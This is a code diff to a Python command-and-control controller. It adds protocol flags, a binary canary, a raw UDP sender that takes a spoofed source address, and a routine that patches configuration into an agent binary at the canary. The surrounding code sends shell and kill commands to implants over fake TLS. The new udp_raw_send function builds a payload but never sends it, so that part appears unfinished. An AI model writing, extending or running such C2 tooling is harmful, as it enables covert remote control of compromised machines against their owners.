@@ -10,6 +10,9 @@ import logging
 class C2:
     KILL = 0x01
     SHELL = 0x02
+    TCP = 0xFF
+    UDP = 0xFE
+    CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
 
     def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
         self.args = args
@@ -24,8 +27,25 @@ class C2:
         Returns:
             bytes: Packed data to be stamped
         """
-        packed_data = struct.pack("!I36x", args.seq)
 
+        if args.protocol == "tcp":
+
+            protocol = self.TCP
+            port = 0
+            seq = args.seq
+        elif args.protocol == "udp":
+            protocol = self.UDP
+            port = args.dport
+            seq = 0
+        else:
+            raise ValueError(f"Unknown protocol: {args.protocol}")
+
+        config_format = "!BHI"
+        empty_byte_len = len(self.CANARY) - struct.calcsize(config_format)
+
+        packed_data = struct.pack(
+            f"{config_format}{empty_byte_len}x", protocol, port, seq
+        )
         return packed_data
 
     def _generate_payload(self, args: argparse.Namespace, is_kill: bool) -> bytes:
@@ -67,6 +87,41 @@ class C2:
 
         return self._send_fake_tls(payload, args)
 
+    def udp_raw_send(self, args: argparse.Namespace) -> bool:
+        """Sends a raw UDP packet to the configured agent.
+
+        Args:
+            args (argparse.Namespace): argparse arguments containing the UDP packet options.
+        """
+
+        try:
+            payload = self._generate_payload(args, False)
+        except UnicodeEncodeError:
+            self.view.print_error("Could not encode shell command.")
+            return False
+
+    def _send_udp(self, payload: bytes, args: argparse.Namespace) -> bool:
+        packet = (
+            IP(dst=args.dip, src=args.sip)
+            / UDP(dport=args.dport, sport=args.sport)
+            / Raw(load=payload)
+        )
+
+        packet_len = len(packet)
+
+        if packet_len > 5000:
+            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
+            return False
+        self.view.print_msg(f"Sending: {packet.summary()}")
+        self.view.print_debug(f"Sending: {packet_len} bytes")
+        try:
+            send(packet, verbose=False)
+            self.view.print_success("Packet sent successfully.")
+        except PermissionError:
+            self.view.print_error(f"Failed to send packet. Are you root?")
+            return False
+        return True
+
     def kill_agent(self, args: argparse.Namespace) -> bool:
         payload = self._generate_payload(args, True)
 
@@ -90,7 +145,6 @@ class C2:
         )
 
         packet_len = len(packet)
-
 
         if packet_len > 5000:
             self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
@@ -121,17 +175,18 @@ class C2:
             return False
 
         with open(path, "rb") as f:
-            agent_data = f.read()
+            data = f.read()
+        agent_data = bytearray(data)
 
-        canary = "According to all known laws of aviation"
-        index = agent_data.find(canary.encode(encoding="utf-8"))
+        index = agent_data.find(self.CANARY)
 
         if index == -1:
             self.view.print_error(f"Could not find agent canary.")
             return False
 
         packed_data = self._get_packed_config(args)
-        new_data = agent_data[:index] + packed_data + agent_data[index + len(canary) :]
+        new_data = agent_data
+        new_data[index : index + len(packed_data)] = packed_data
 
         output_dir = Path(args.output)
         output_dir.mkdir(parents=True, exist_ok=True)
